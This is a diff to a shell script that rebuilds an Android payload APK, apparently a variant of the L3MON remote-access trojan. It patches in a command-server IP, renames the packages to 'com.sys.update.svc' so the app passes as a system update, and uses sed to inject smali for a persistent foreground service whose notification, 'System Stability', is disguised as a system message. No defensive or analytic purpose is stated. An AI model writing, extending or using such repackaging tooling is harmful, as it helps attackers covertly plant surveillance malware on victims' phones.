@@ -17,21 +17,52 @@ if [ -d "payload_source/smali/$OLD_PATH" ]; then
     rm -rf "payload_source/smali/com/etechd"
 fi
 
-# 2. Update SDK for Android 14
-sed -i 's/minSdkVersion: .*/minSdkVersion: 26/g' payload_source/apktool.yml
-sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
-sed -i 's/minSdkVersion="[0-9]*"/minSdkVersion="26"/g' payload_source/AndroidManifest.xml
-sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml
-
-# 3. Patch IP
+# 2. Patch IP
 chmod +x patch_payload.sh
 sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
 ./patch_payload.sh
 
-# 4. Disable Loop and Finish (Minimal Stable)
-sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
-sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
-sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+# 3. Create Foreground Service Injection
+cat > foreground.smali <<LURE
+    # Create Notification Channel
+    const-string v0, "service_channel"
+    const-string v1, "System Stability"
+    const/4 v2, 0x2
+    new-instance v3, Landroid/app/NotificationChannel;
+    invoke-direct {v3, v0, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
+    const-string v0, "notification"
+    invoke-virtual {p0, v0}, L$NEW_PATH/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    move-result-object v0
+    check-cast v0, Landroid/app/NotificationManager;
+    invoke-virtual {v0, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
 
-# 5. Manifest
+    # Build Notification
+    new-instance v0, Landroid/app/Notification$Builder;
+    const-string v1, "service_channel"
+    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
+    const-string v1, "System Stability"
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+    move-result-object v0
+    const-string v1, "Optimizing system performance..."
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+    move-result-object v0
+    const/high16 v1, 0x7f030000 # ic_launcher
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
+    move-result-object v0
+    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
+    move-result-object v0
+
+    # Start Foreground (ID: 1)
+    const/4 v1, 0x1
+    invoke-virtual {p0, v1, v0}, L$NEW_PATH/MainService;->startForeground(ILandroid/app/Notification;)V
+LURE
+
+# 4. Inject Foreground logic into MainService.smali
+# We need to increase .locals to 6 to avoid register collisions
+sed -i 's/.locals 4/.locals 6/g' "payload_source/smali/$NEW_PATH/MainService.smali"
+sed -i "/.method public onStartCommand/a \\    # Injected Foreground Logic" "payload_source/smali/$NEW_PATH/MainService.smali"
+sed -i "/# Injected Foreground Logic/r foreground.smali" "payload_source/smali/$NEW_PATH/MainService.smali"
+
+# 5. Clean up Manifest (Final Polish)
 sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
+sed -i "s|com.etechd.l3mon.MainService|com.sys.update.svc.MainService|g" payload_source/AndroidManifest.xml
